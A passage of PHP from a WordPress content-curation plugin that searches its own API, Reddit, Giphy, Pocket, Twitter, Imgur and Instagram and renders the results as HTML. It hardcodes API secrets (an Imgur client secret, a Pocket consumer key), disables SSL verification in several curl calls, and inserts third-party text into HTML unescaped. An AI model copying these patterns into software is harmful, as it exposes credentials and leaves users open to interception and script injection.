        $data = ybi_curation_suite_api_call('cs/search/curationbot', $send_data, array(), true);
        $search_results = $data['results'];
        $total_results = $data['total'];
        foreach ($search_results as $ContentItem) {
            $date = new DateTime($ContentItem['published_date']);
            $pubDate = $date->format('Y-m-d H:i:s');
            $imageURL = $ContentItem['image_src'];
            $current_url = $ContentItem['url'];
            $publisherName = $ContentItem['source_domain'];
            $title = $ContentItem['title'];
            $snippet = $ContentItem['snippet'];

            $ContentItemData = $ContentItem['ContentItemData']['data'];
            $data_html = '<p><i class="fa fa-share-alt-square total_share" aria-hidden="true"></i> ' . number_format($ContentItemData['total_shares']) .
                ' &nbsp;&nbsp;<i class="fa fa-facebook facebook" aria-hidden="true"></i> ' .number_format($ContentItemData['facebook_likes']) .
                ' &nbsp;&nbsp;<i class="fa fa-linkedin linkedin" aria-hidden="true"></i> ' . number_format($ContentItemData['linkedIn']) .
                ' &nbsp;&nbsp;<i class="fa fa-google-plus googleplus" aria-hidden="true"></i> ' . number_format($ContentItemData['google_plus']) .
                ' &nbsp;&nbsp;<i class="fa fa-pinterest pinterest" aria-hidden="true"></i> ' . number_format($ContentItemData['pinterest']) . '</p>';

            $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName, $pubDate, $load_direct_share,$data_html,$cs_highlight_curated_content);
            $i++;
        }
        $alternate = '';
        //active_platform  Cur-Suite-030f38634a24
        $active_plaform = $data['active_platform'];
        if(!$active_plaform) {
            $post_list .= '<tr class="type-post status-publish format-standard hentry center' . $alternate . '"><td colspan="2" class="cbot_upgrade_row">
            <p class="cbot_upgrade_title"><strong><i class="fa fa-angle-double-down" aria-hidden="true"></i> SEARCH RESULT LIMIT <i class="fa fa-angle-double-down" aria-hidden="true"></i></strong></p>
            <p class="cbot_upgrade_sub"> 50+ more real time results with active Listening Engine.<p>
            <p class="cbot_upgrade_links">
            <a href="'.self_admin_url('admin.php?page=curation_suite_display_settings').'" target="_blank" title="Active Your Listening Engine"><i class="fa fa-toggle-on" aria-hidden="true"></i> Activate</a>
            <a href="https://members.youbrandinc.com/special-offers/" target="_blank" title="Upgrade to the Listening Engine"><i class="fa fa-plus-circle" aria-hidden="true"></i> Upgrade</a>
            <a href="https://curationsuite.com/listening-engine/" target="_blank" title="Learn more about the Listening Engine"><i class="fa fa-superpowers" aria-hidden="true"></i> Learn More...</a></p>
            <br /><br /></td></tr>';
        } else {
            $post_list .= '<tr class="type-post status-publish format-standard hentry center' . $alternate . '"><td colspan="2" class="cbot_upgrade_row">
            <p class="cbot_upgrade_title"><strong> '.$total_results.' Search Results </strong></p>';

            if($total_results<20) {
                $post_list .= '<p class="cbot_upgrade_sub"> If you got less results than you expect try modifying your search term a bit.<p>';
            }
            $post_list .= '<br /><br /></td></tr>';
        }

        $post_list .= '</table>';
    } //if($search_type == 'cs_le')

    if ($search_type == 'cs_le') {


        if ($orderby == 'relevance')
            $orderby = 'Relevance';
        if ($orderby == 'published')
            $orderby = 'Date';
        if ($language == '')
            $language = 'en-US';
        if ($start == '' || $start == 0)
            $startCalcNum = 0;
        else
            $startCalcNum = ($start - 1) * 10;

        $orderby = 'total_shares';
        $search_column = 'all';
        $send_data = array('search_type' => $search_column, 'search_term' => $search_query, 'order_by' => $orderby);
        $data = ybi_curation_suite_api_call('cs/search/le', $send_data, array(), true);
        $search_results = $data['results'];
        foreach ($search_results as $ContentItem) {
            $date = new DateTime($ContentItem['published_date']);
            $pubDate = $date->format('Y-m-d H:i:s');
            $imageURL = $ContentItem['image_src'];
            $current_url = $ContentItem['url'];
            $publisherName = $ContentItem['source_domain'];
            $title = $ContentItem['title'];
            $snippet = $ContentItem['snippet'];

            $ContentItemData = $ContentItem['ContentItemData']['data'];
            $data_html = '<p>';

            if ($ContentItemData['moz_score'] > 0)
                $data_html .= '<span class="moz_icon"> : ' . $ContentItem['DomainData']['data']['moz_score'] . '</span>';

            $data_html .= '<i class="fa fa-share-alt-square total_share" aria-hidden="true"></i> ' . number_format($ContentItemData['total_shares']) .
                ' &nbsp;&nbsp;<i class="fa fa-facebook facebook" aria-hidden="true"></i> ' .number_format($ContentItemData['facebook_total']) .
                ' &nbsp;&nbsp;<i class="fa fa-linkedin linkedin" aria-hidden="true"></i> ' . number_format($ContentItemData['linkedin_shares']) .
                ' &nbsp;&nbsp;<i class="fa fa-google-plus googleplus" aria-hidden="true"></i> ' . number_format($ContentItemData['googleplus_shares']) .
                ' &nbsp;&nbsp;<i class="fa fa-pinterest pinterest" aria-hidden="true"></i> ' . number_format($ContentItemData['pinterest_shares']) . '</p>';

            $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName, $pubDate, $load_direct_share, $data_html,$cs_highlight_curated_content);
            $i++;
        }
        $active_plaform = $data['active_platform'];
        if(!$active_plaform) {
            $post_list .= '<tr class="type-post status-publish format-standard hentry center' . $alternate . '"><td colspan="2" class="cbot_upgrade_row">
            <p class="cbot_upgrade_title"><strong><i class="fa fa-angle-double-down" aria-hidden="true"></i> SEARCH RESULT LIMIT <i class="fa fa-angle-double-down" aria-hidden="true"></i></strong></p>
            <p class="cbot_upgrade_sub"> 50+ more real time results with active Listening Engine.<p>
            <p class="cbot_upgrade_links">
            <a href="'.self_admin_url('admin.php?page=curation_suite_display_settings').'" target="_blank" title="Active Your Listening Engine"><i class="fa fa-toggle-on" aria-hidden="true"></i> Activate</a>
            <a href="https://members.youbrandinc.com/special-offers/" target="_blank" title="Upgrade to the Listening Engine"><i class="fa fa-plus-circle" aria-hidden="true"></i> Upgrade</a>
            <a href="https://curationsuite.com/listening-engine/" target="_blank" title="Learn more about the Listening Engine"><i class="fa fa-superpowers" aria-hidden="true"></i> Learn More...</a></p>
            <br /><br />
            </td></tr>';
        }

        $post_list .= '</table>';
    } //if($search_type == 'cs_le')

    if ($search_type == 'reddit') {
        //$orderby = 'new';
        //$search_query = 'drone';
        $type = 'link';
        if ($time_frame == '')
            $time_frame = 'all';

        //https://www.reddit.com/search.json?q=ferrari&sort=hot&type=link
        $url = 'https://www.reddit.com/search.json?q=' . urlencode($search_query) . '&sort=' . $orderby . '&type=' . $type . '&limit=' . $total_results . '&t=' . $time_frame;
        $process = curl_init($url);
        curl_setopt($process, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($process, CURLOPT_USERPWD, "username:XXXX");
        curl_setopt($process, CURLOPT_TIMEOUT, 30);
        curl_setopt($process, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($process, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($process);
        curl_close($process);
        $json = json_decode($response);
        $search_results = $json->data->children;
        $c = count($search_results);
        $alternate = '';
        $total_ignored = 0;
        $results_html = '';
        foreach ($search_results as $searchResult) {
            //var_dump($searchResult);
            $result_data = $searchResult->data;
            $ext_domain = $searchResult->data->domain;

            //if(ybi_startsWith($ext_domain,'self.')) {
            if ($result_data->is_self) {
                $ext_domain = 'self';
            }
            // if we ignore self threads then we count so we display below and continue
            if ($search_ignore == 'ignore-threads') {
                if ($ext_domain == 'self') {
                    $total_ignored++;
                    continue;
                }
            }

            $playerHTML = '';
            $description = '';
            $current_url = '';
            $title = '';
            $full_embed_link = '';
            $playerHTML = '';
            $alternate = '';
            $total_comments = 0;
            $total_ups = 0;
            $total_downs = 0;
            $subreddit = '';
            $add_to_post_link = '';
            $imageURL = '';
            $reddit_thread_id = '';
            if (0 != $i % 2): $alternate = ' alternate'; endif;

            $date = new DateTime();
            $date->setTimestamp($result_data->created);
            $pubDate = $date->format('m/d/Y H:i:s');  //$item->time_ago;//$date->format('m/d/Y H:i:s');
            $title = $result_data->title;
            $reddit_thread_id = $result_data->id;
            $reddit_link = 'https://reddit.com/';

            $publisherName = '';
            $imageURL = '';

            $publisherName = $ext_domain;
            $current_url = trim($result_data->url);
            $subreddit = $result_data->subreddit;
            $total_comments = $result_data->num_comments;
            $total_ups = $result_data->ups;
            $total_downs = $result_data->downs;
            $over_18 = $result_data->over_18;

            //var_dump($result_data->preview->images);

            if (cs_isImageFile($current_url)) {
                $imageURL = $current_url;
            }
            if (($result_data->preview->images)) {
                $imageURL = $result_data->preview->images[0]->source->url;
            }

            $reddit_link .= $result_data->permalink;
            $subreddit_link = '<a href="https://reddit.com/r/' . $subreddit . '" target="_blank">' . $subreddit . '</a>';
            if ($ext_domain == 'youtu.be' || $ext_domain == 'm.youtube.com') {
                $ext_domain = 'youtube.com';
            }


            switch ($ext_domain) {
                case 'youtube.com':
                    $current_url_dec = urldecode($current_url); // decode the url
                    $youtube_video_id = cs_getYouTubeVideoID($current_url_dec); // try to get a youtube video id - standard url
                    // if we didn't get a video id we then try one more time based on how reddit often encodes the url
                    if ($youtube_video_id == '') {
                        $stripe_white_space = preg_replace('/\s/', '', $current_url_dec); // NOTE: Scrub potential whitespace.
                        // sometimes the URL has an attribution_link and below this will parse the url and provide the ID of the video
                        preg_match('/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/\S*(?:(?:\/e(?:mbed))?\/|attribution_link\?a=.+?watch.+?v(?:%|=)|watch\?(?:\S*?&?v\=))|youtu\.be\/)([a-zA-Z0-9_-]{6,11})(&.*)*/', $stripe_white_space, $matches);
                        if (is_array($matches)) {
                            if (array_key_exists(1, $matches))
                                $youtube_video_id = $matches[1];
                        }

                    }
                    if ($youtube_video_id) {
                        $full_embed_link = '//www.youtube.com/embed/' . $youtube_video_id;
                        $current_url = 'https://youtube.com/watch?v=' . $youtube_video_id;
                    }

                    break;
                case 'imgur.com':
                    if ($result_data->thumbnail != '' && !$over_18)
                        $imageURL = $result_data->thumbnail;
                    if ($imageURL == '' && !$over_18) {
                        $imageURL = $current_url;
                        $imageURL = str_replace('.gifv', '.gif', $imageURL);
                    }

                    $add_to_post_link = getAddToPostLink($i, $current_url, '<i class="fa fa-picture-o imgur"></i> ');
                    break;
                case 'i.imgur.com':

                    if ($result_data->thumbnail != '' && !$over_18)
                        $imageURL = $result_data->thumbnail;

                    if ($imageURL == '' && !$over_18) {
                        $imageURL = $current_url;
                        $imageURL = str_replace('.gifv', '.gif', $imageURL);
                    }
                    $add_to_post_link = getAddToPostLink($i, $current_url, '<i class="fa fa-picture-o imgur"></i> ');
                    break;
                case 'gfycat.com':
                    //echo 'youtube';
                    $imageURL = $result_data->thumbnail;
                    $add_to_post_link = getAddToPostLink($i, $current_url, '<i class="fa fa-picture-o"></i> ');

                    break;
                case 'twitter.com':
                    //echo 'youtube';
                    //$playerHTML = wp_oembed_get($current_url);
                    $twitter_user = getTwitterUserNameFromTwitterString($current_url);
                    // notice the data-tweet-id is not the true id of the Tweet, it's unique to this result or the thread id.
                    $playerHTML = '<div class="cs_embed_block">
<div class="left_embed_quick_add_w">
	<div class="left_embed_quick_add_int">
	<a href="javascript:;" data-url="' . $current_url . '" data-tweet-user="' . $twitter_user . '" data-tweet-id="tweet_' . $reddit_thread_id . '" class="embed_quick_add_link"><i class="fa fa-caret-left"></i></a>
	</div>
	</div>

					<div class="cs_twitter_embed_search">' . wp_oembed_get($current_url) . '</div></div>';
                    $add_to_post_link = getAddToPostLink($i, $current_url, '<i class="fa fa-twitter twitter"></i> ');
                    break;
                case 'self':
                    //echo 'self';
                    $description = html_entity_decode($searchResult->data->selftext_html);
                    $publisherName = 'Subreddit: ' . $subreddit_link;
                    $description = cs_limit_words_with_dots($description, 150);
                    $description = preg_replace('/(<a href="[^"]+")>/is', '\\1 target="_blank">', $description); // add raget="_blank" to links
                    $description = strip_tags($description, '<a><p>'); // only keep links and paragraphs
                    break;
            }

            if ($full_embed_link != '' && $ext_domain == 'youtube.com') {
                $add_to_post_link = getAddToPostLink($i, $current_url, '<i class="fa fa-youtube youtube"></i> ');
                //$playerHTML = '<div class="on_demand_player_w"><iframe width="350" height="185" src="'.$full_embed_link.'" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe></div>';

                $playerHTML = '
<div class="cs_embed_block">
	<div class="left_embed_quick_add_w">
		<div class="left_embed_quick_add_int">
		<a href="javascript:;" data-url="' . $current_url . '" class="embed_quick_add_link"><i class="fa fa-caret-left"></i></a>
		</div>
	</div>
	<div class="on_demand_player_w">
		<iframe width="350" height="185" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe>
	</div>
</div>';

            }

            $nsfw_html = '';
            if ($over_18) {
                $nsfw_html = '<span class="cs_nsfw"><img src="' . plugins_url() . '/curation-suite/i/nsfw.gif" /></span>';
                $imageURL = ''; // don't show the image
            }

            if ($imageURL != '')
                $imageURL = '<span class="content_demand_image_span"><img src="' . $imageURL . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';

            $results_html .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td>' . $imageURL . '
                            <a href="' . $current_url . '" target="_blank" class="link_lp' . $i . '" style="font-size: 14px;">' . $nsfw_html . $title . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>
                            <br />from ' . $publisherName . ' published on ' . $pubDate . '<p><i class="fa fa-comments"></i> ' . $total_comments . ' &nbsp;<i class="fa fa-thumbs-up"></i> ' . $total_ups . ' &nbsp;<i class="fa fa-thumbs-down"></i> ' . $total_downs . ' &nbsp;<i class="fa fa-reddit reddit" aria-hidden="true"></i> ' . $subreddit_link . '</p>
                            <p><span class="cs_search_description">' . $description . '</span></p>' . $playerHTML . '
                            </td><td class="content_search_actions"><a href="' . $reddit_link . '" target="_blank" class="reddit"><i class="fa fa-reddit reddit"></i> view on reddit</a><br><br>';

            if ($add_to_post_link != '')
                $results_html .= '<p>' . $add_to_post_link . '</p>';

            //<img src="'.plugins_url().'/curation-suite/i/curation-suite-icon-10x13.png" />
            $results_html .= '<p><a href="javascript:;" class="link_to_load" name="' . ($current_url) . '"><span style="margin-bottom: 2px;"> Curate</span></a></p>';

            if ($load_direct_share)
                $results_html .= getSocialShareBlock($title, $current_url);

            $results_html .= '</td></tr>';
            $alternate = '';
            $i++;
        }
        // if we have ignored results we display the amount
        if ($total_ignored > 0) {
            $post_list .= '<p class="center cs_bad">Total Ignored Results: <strong>' . $total_ignored . '</strong></p>';
        }
        $post_list .= $results_html . '</table>';
    }
    if ($search_type == 'giphy') {
        $account_key = 'dc6zaTOxFJmzC';
        //http://api.giphy.com/v1/gifs/search?q=ryan+gosling&api_key=dc6zaTOxFJmzC&limit=5
        $url = "http://api.giphy.com/v1/gifs/search?q=" . urlencode($search_query) . "&api_key=" . $account_key;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $json = curl_exec($ch);
        $data = json_decode($json);
        $search_results = $data->data;
        $c = count($search_results);
        $i = 0;
        $post_list .= '<p style="text-align: right;"><a href="" target="_blank">Powered by Giphy</a></p>';
        foreach ($search_results as $search_result) {
            $img_url = '' . $search_result->images->original->url;
            $imageURL = '<span class="content_demand_image_span giphy_image_span"><img src="' . $img_url . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
            $post_list .= '<div style="clear: both; margin: 0 auto; overflow: auto; padding: 10px 0;">' . $imageURL . '</div>';
            $i++;
        }

    }
    if ($search_type == 'pocket') {

        $pocket_access_data = get_option('cs_Pocket_access_data');
        if (is_array($pocket_access_data)) {
            if (array_key_exists('access_token', $pocket_access_data)) {
                $pocket_access_key = $pocket_access_data['access_token'];
                $url = 'https://getpocket.com/v3/get';
                $param_data = array(
                    'consumer_key' => '33207-251450d0f1846fda36b368f2',
                    'access_token' => $pocket_access_key,
                    'state' => $search_ignore,
                    'detailType' => 'complete',
                    'sort' => $orderby,
                    'count' => $total_results
                );
                if ($search_query) {
                    $param_data['search'] = $search_query;
                }

                $data = ybi_do_external_service_call($url, $param_data);
                $search_results = $data['list'];
                $i = 0;
                $post_list .= '<p class="center"><a href="https://getpocket.com/a/queue/" target="_blank"><img src="' . YBI_BASE_URL . '/i/pocket-logo.png" /></a></p>';
                foreach ($search_results as $search_result) {
                    $pubDate = '';
                    if (array_key_exists('time_added', $search_result)) {
                        $dtStr = date("c", $search_result['time_added']);
                        $date = new DateTime($dtStr);
                        $pubDate = $date->format('m/d/Y H:i:s');
                    }

                    $imageURL = '';
                    $images_arr = $search_result['images'];
                    if (!empty($images_arr)) {
                        $list_combined = '';
                        //class="thumb_lp'.$i.'" />'.getImageActionLinks($i).'
                        if ($images_arr[1]['src'])
                            $imageURL = $images_arr[1]['src'];
                    }
                    $current_url = $search_result['resolved_url'];
                    $publisherName = ybi_get_domain_name($current_url);
                    $title = $search_result['resolved_title'];
                    $snippet = $search_result['excerpt'];
                    $data_html = '';
                    $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName,$pubDate,$load_direct_share,$data_html,$cs_highlight_curated_content);
                    $i++;
                }

                if ($i == 0) {
                    $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td><h3 class="cs_bad">';
                    if ($search_query) {
                        $post_list .= 'The Pocket search only searches the titles of links you have saved. To load all your saved links do not enter a search keyword.';
                    } else {
                        $post_list .= 'No links found with above search.';
                    }
                    $post_list .= '</h3></td></tr>';
                }
            }
        } else {
            // no access data
            $post_list .= '<tr><td><h3 class="cs_bad center"><strong>Pocket not connected</strong>. <a href="' . admin_url('admin.php?page=youbrandinc-oauth') . '" target="_blank">Connect Your Pocket Account</a></h3></td></tr>';
        }
        $post_list .= '</table>';
    }

    if ($search_type == 'twitter') {
        // load the Twitter access classes, notice all these includes have YBI_BASE_PATH and requires the YBI licensing plugin
        if (!class_exists('TwitterAPIExchange')) {
            require_once YBI_BASE_PATH . 'vendor/autoload.php';
        }
        include_once(YBI_BASE_PATH . 'vendor/ybi/twitter/Status.php');
        include_once(YBI_BASE_PATH . 'vendor/ybi/twitter/TwitterUser.php');
        include_once(YBI_BASE_PATH . 'vendor/ybi/twitter/Media.php');
        include_once(YBI_BASE_PATH . 'vendor/ybi/twitter/Entities.php');
        include_once(YBI_BASE_PATH . 'vendor/ybi/twitter/Url.php');

        $cs_twitter_oauth_access_token = trim($options['cs_twitter_oauth_access_token']);
        $cs_twitter_oauth_access_token_secret = trim($options['cs_twitter_oauth_access_token_secret']);
        $cs_twitter_consumer_key = trim($options['cs_twitter_consumer_key']);
        $cs_twitter_consumer_secret = trim($options['cs_twitter_consumer_secret']);
        $is_error = false;
        $error_msg = '';
        $error_code = 0;
        $current_page = 0;

        if ($language == '')
            $language = 'en';

        if ($cs_twitter_oauth_access_token && $cs_twitter_oauth_access_token_secret && $cs_twitter_consumer_key && $cs_twitter_consumer_secret) {
            $count_posts = 0;
            $settings = array(
                'oauth_access_token' => $cs_twitter_oauth_access_token,
                'oauth_access_token_secret' => $cs_twitter_oauth_access_token_secret,
                'consumer_key' => $cs_twitter_consumer_key,
                'consumer_secret' => $cs_twitter_consumer_secret
            );

            if ($orderby == '')
                $orderby = 'recent';

            $url = 'https://api.twitter.com/1.1/search/tweets.json';

            if ($start)
                $getfield = '?max_id=' . $start . '&q=' . urlencode($search_query) . '&result_type=' . $orderby . '&lang=en&count=8';
            else
                $getfield = '?q=' . urlencode($search_query) . '&result_type=' . $orderby . '&lang=' . $language . '&count=8';

            $requestMethod = 'GET';

            $twitter = new TwitterAPIExchange($settings);
            $response = $twitter->setGetfield($getfield)
                ->buildOauth($url, $requestMethod)
                ->performRequest();

            $response_json = json_decode($response);

            if (isset($response_json->errors)) {
                foreach ($response_json->errors as $error) {
                    $error_code .= $error->code;
                    $error_msg .= $error->message;
                }
                $is_error = true;
            }

            if (!$is_error) {
                $next_page = $response_json->search_metadata->next_results;
                if ($next_page) {
                    $parts = parse_url($next_page);
                    parse_str($parts['query'], $query);
                    $next_page = $query['max_id'];
                }

                $raw_statuses = $response_json->statuses;

                foreach ($raw_statuses as $raw_status) {
                    $Status = new Status();
                    $Status->setCreatedAt($raw_status->created_at);
                    $Status->setIdStr($raw_status->id_str);
                    $Status->setText($raw_status->text);
                    $Status->setSource(strip_tags($raw_status->source));
                    $Status->setSourceRaw($raw_status->source);
                    $Status->setRetweetCount($raw_status->retweet_count);
                    $Status->setFavoriteCount($raw_status->favorite_count);

                    $raw_user = $raw_status->user;
                    $TwitterUser = new TwitterUser();
                    $TwitterUser->setName($raw_user->name);
                    $TwitterUser->setTwitterId($raw_user->id_str);
                    $TwitterUser->setScreenName($raw_user->screen_name);
                    $TwitterUser->setDescription($raw_user->description);
                    $TwitterUser->setUrl($raw_user->url);
                    $TwitterUser->setProfileImageUrl($raw_user->profile_image_url_https);
                    $TwitterUser->setFollowersCount($raw_user->followers_count);
                    $TwitterUser->setFriendsCount($raw_user->friends_count);
                    $TwitterUser->setListedCount($raw_user->listed_count);
                    $TwitterUser->setStatusesCount($raw_user->statuses_count);
                    $TwitterUser->setCreatedAt($raw_user->created_at);
                    $TwitterUser->setFollowing($raw_user->following);
                    $TwitterUser->calculateRecommendFollow();
                    $Status->addTwitterUser($TwitterUser);

                    $raw_entitites = $raw_status->entities;
                    if (isset($raw_entitites->media)) {
                        foreach ($raw_entitites->media as $raw_media) {
                            $Media = new Media();
                            $Media->setIdStr($raw_media->id_str);
                            $Media->setMediaUrlHttps($raw_media->media_url_https);
                            $Status->addMedia($Media);
                        }

                    }
                    $status_url = 'https://twitter.com/' . $TwitterUser->getScreenName() . '/status/' . $Status->getIdStr();

                    //$post_list .=  '<p><a href="javascript:;" class="add_tweet">'.$status_url.'</a></p>'.wp_oembed_get($status_url);
                    $post_list .= '<div style="clear: both; margin: 0 auto; overflow: auto;"><div style="height: auto; width: 20px; float: left;">
<div style="float: left; width: 10%;">
<a href="javascript:;" data-type="twitter" data-url="' . $status_url . '" data-tweet-user="' . $TwitterUser->getScreenName() . '" data-tweet-id="' . $Status->getIdStr() . '" class="embed_quick_add_link" style="display: block; padding-bottom: 38px; min-width: 40px; height: 77px; background: #c6c6c6; margin-top: 11px;">
<i class="fa fa-caret-left" style="margin-top: 41px;padding-left: 5px;font-size: 27px;"></i></a></div></div>
<div style="height: auto; float: left; width: 90%">' . wp_oembed_get($status_url) . '</div></div>';
                    $status_arr[] = $Status;
                }
            }

        } else {
            $post_list .= '<p><strong>Missing Twitter Credentials</strong></p><p>To use the Twitter search you need to create a <a href="https://apps.twitter.com/" target="_blank">Twitter APP</a>.
Creating a Twitter APP is simple and easy to do. Below is a tutorial showing you how. Once you have created your APP you will want to enter your Twitter Credentials within the Curation Suite Admin Screen.</p>
<div><iframe width="560" height="315" src="https://www.youtube.com/embed/8UKEs-z9NKI" frameborder="0" allowfullscreen></iframe></div>';
        }

        if ($is_error) {
            $post_list .= '<p><strong>Twitter Error - Please Re-Enter Credentials</strong></p><p>code: ' . $error_code . ' - message: ' . $error_msg . '</p>';
        }

        if ($next_page != '')
            $post_list .= '<a href="javascript:;" class="move_page" rel="' . $next_page . '">View Next Tweets from <em>' . $search_query . '</em></a>';

        $post_list .= '</table>';
    }

    if ($search_type == 'imgur') {
        if ($language == '')
            $language = 'en';

        if ($start == '' || $start == 0)
            $startCalcNum = 1;
        else
            $startCalcNum = intval($start);

        $service_access_good = false;
        $searvice_message = '';

        if (!class_exists('Client')) {
            require_once YBI_BASE_PATH . 'vendor/autoload.php';
        }

        $client = new \Imgur\Client();
        $client->setOption('client_id', 'e07565ce853e1e9');
        $client->setOption('client_secret', '12433439b84bbbd114998238109a660010229e80');
        $imgur_access_data = null;
        $imgur_access_data = get_option('cs_ImgUr_access_data');
        if ($imgur_access_data) {
            $service_access_good = true;
            $client->setAccessToken($imgur_access_data);
            if ($client->checkAccessTokenExpired()) {
                $client->refreshToken();
            }
        }

        if ($service_access_good) {

            try {
                if ($search_query == '') {
                    //$section = 'hot', $sort = 'viral', $page = 0, $window = 'day', $showViral = true
                    $search_results = $client->api('gallery')->gallery('hot', $orderby);
                } else {
                    $search_results = $client->api('gallery')->search($search_query, $orderby);
                }
            } catch (Exception $e) {
                $service_access_good = false;
                // if we got here there was some access error. The best thing to do would be remove the current saved access info and have the user reconnect.
                delete_option('cs_ImgUr_access_data');
            }

            if ($service_access_good) {
                $search_results_total = count($search_results);

                //add_thickbox();
                foreach ($search_results as $searchResult) {
                    //var_dump($searchResult);

                    $playerHTML = '';

                    $dtStr = date("c", $searchResult['datetime']);
                    $date = new DateTime($dtStr);
                    $pubDate = $date->format('m/d/Y H:i:s');
                    $views_total = $searchResult['views'];
                    $total_ups = ($searchResult['ups']);
                    $total_downs = $searchResult['downs'];
                    $comments_total = $searchResult['comment_count'];
                    $imageURL = '';
                    if (0 != $i % 2): $alternate = ' alternate'; endif;

                    $current_url = $searchResult['link'];
                    $publisherName = $searchResult['account_url'];

                    $full_embed_link = $current_url;

                    // if user selected to show player then we build it here
                    if ($show_player == 'true')
                        $playerHTML = '<div class="on_demand_player_w"><iframe width="320" height="180" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe></div>';

                    $playerHTML = '<div style="clear: both; margin: 0 auto; overflow: auto;"><div style="height: auto; width: 20px; float: left;"><div style="float: left; width: 10%;">
<a href="javascript:;" data-type="imgur" data-url="' . $current_url . '" class="embed_quick_add_link" style="display: block; padding-bottom: 38px; min-width: 40px; height: 77px; background: #c6c6c6; margin-top: 11px;">
<i class="fa fa-caret-left" style="margin-top: 41px;padding-left: 5px;font-size: 27px;"></i></a></div></div>
<div style="height: auto; float: left; width: 90%">' . wp_oembed_get($current_url) . '</div></div>';

                    $cqs_details = 'channel=youtube&views=0';
                    // image and buiding out the display
                    if (array_key_exists('cover', $searchResult)) {
                        $imageURL = '<span class="content_demand_image_span"><img src="http://imgur.com/' . $searchResult['cover'] . '.jpg" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                    } else {
                        if (array_key_exists('type', $searchResult)) {
                            if ($searchResult['type'] == 'image/jpeg') {
                                $imageURL = '<span class="content_demand_image_span"><img src="' . $current_url . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                            }
                        }
                    }
                    $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td>' . $imageURL . '
                            <a href="' . $current_url . '" class="link_lp' . $i . '" target="_blank">' . $searchResult['title'] . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>
                            <br />from ' . $publisherName . ' published on ' . $pubDate . ' <p><p><i class="fa fa-eye" aria-hidden="true"></i> ' . number_format($views_total) . ' &nbsp;&nbsp;<i class="fa fa-comments" aria-hidden="true"></i> ' . number_format($comments_total) . '&nbsp;&nbsp; 
                             <i class="fa fa-thumbs-up" aria-hidden="true"></i> ' . number_format($total_ups) . ' &nbsp;&nbsp;<i class="fa fa-thumbs-down" aria-hidden="true"></i> ' . number_format($total_downs) . '&nbsp;&nbsp;</p>' . $searchResult['description'] . '
                            </p>' . $playerHTML . '
                            </td><td class="content_search_actions">' . getAddToPostLink($i, $current_url) . ' | <a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>';
                    if ($load_direct_share)
                        $post_list .= getSocialShareBlock($searchResult['title'], $current_url);

                    $post_list .= '</td></tr>';
                    // get ready and iterate
                    $alternate = '';
                    $i++;

                    if ($i == $total_results)
                        break;
                }
            }
        }
        if (!$service_access_good) {
            $post_list .= '<tr><td><h3 class="cs_bad center"><strong>ImgUr not connected</strong>. <a href="' . admin_url('admin.php?page=youbrandinc-oauth') . '" target="_blank">Connect Your ImgUr Account</a></h3></td></tr>';
        }
        $post_list .= '</table>';
    }
    if ($search_type == 'instagram') {
        if ($language == '')
            $language = 'en';

        if ($start == '' || $start == 0)
            $startCalcNum = 1;
        else
            $startCalcNum = intval($start);

        $service_access_good = false;
        $searvice_message = '';


        if (!class_exists('Instagram')) {
            require_once YBI_BASE_PATH . 'vendor/autoload.php';
        }
        $instagram = new \Instagram\Instagram();
        $access_data = null;
        $search_results = null;
        $is_login_error = false;
        if (array_key_exists('cs_instagram_username', $options) && array_key_exists('cs_instagram_password', $options)) {
            if ($options['cs_instagram_username'] && $options['cs_instagram_password']) {


                $savedSession = get_option('cs_instagram_session');
                try {
                    if ($savedSession) {
                        $instagram->initFromSavedSession($savedSession);
                        $service_access_good = true;
                    } else {
                        $instagram->login($options['cs_instagram_username'], $options['cs_instagram_password']);
                        $service_access_good = true;
                    }
                } catch (Exception $e) {
                    delete_option('cs_instagram_session');
                    $is_login_error = true;
                    $post_list .= '<tr><td><h3 class="cs_bad center"><strong>Login into Instagram with this browser.</strong>. Sometimes Instagram requires you to verify your account when you login from somewhere different. <a href="https://instagram.com/" target="_blank">Login and verify</a>.</h3></td></tr>';
                }
            }
        }
        $search_good = true;
        if ($service_access_good) {
            //Serialize the Session into a JSON string
            $savedSession = $instagram->saveSession();
            update_option('cs_instagram_session', $savedSession);

            /** @var $service_result TagFeedResponse */
            try {
                if ($search_query == '') {
                    //$section = 'hot', $sort = 'viral', $page = 0, $window = 'day', $showViral = true

                    $service_result = $instagram->getTimelineFeed();
                    $search_results = $service_result->getItems();
                } else {
                    $search_query = str_replace('#', '', $search_query);
                    $search_query = str_replace(' ', '', $search_query);
                    $service_result = $instagram->getTagFeed($search_query);
                    if ($orderby == 'top') {
                        $search_results = $service_result->getRankedItems();
